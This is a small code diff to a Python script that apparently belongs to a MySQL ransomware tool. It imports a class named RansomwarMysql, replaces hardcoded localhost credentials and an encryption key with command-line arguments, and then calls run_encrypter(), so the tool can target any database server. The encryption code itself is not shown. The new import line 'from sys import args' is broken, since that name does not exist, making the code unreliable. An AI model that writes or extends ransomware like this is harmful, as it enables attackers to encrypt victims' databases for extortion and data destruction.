@@ -1,6 +1,7 @@
 from tools.mysqlDB import RansomwarMysql
 from datetime import datetime
 from colorama import Fore
+from sys import args
 class Main(RansomwarMysql):
     def __init__(self, attack_method:str ,*args, **kwargs) -> None:
         if attack_method == "mysql":
@@ -42,5 +43,5 @@ class Main(RansomwarMysql):
         self.print_log(f"decrypted all databases")
         
 if __name__ == "__main__":
-    app = Main(attack_method='mysql' , host="localhost" , username="root" , password="password" , key="1234567890123456")
+    app = Main(attack_method='mysql' , host=args[1] , username=args[2] , password=args[3] , key=args[4])
     app.run_encrypter()
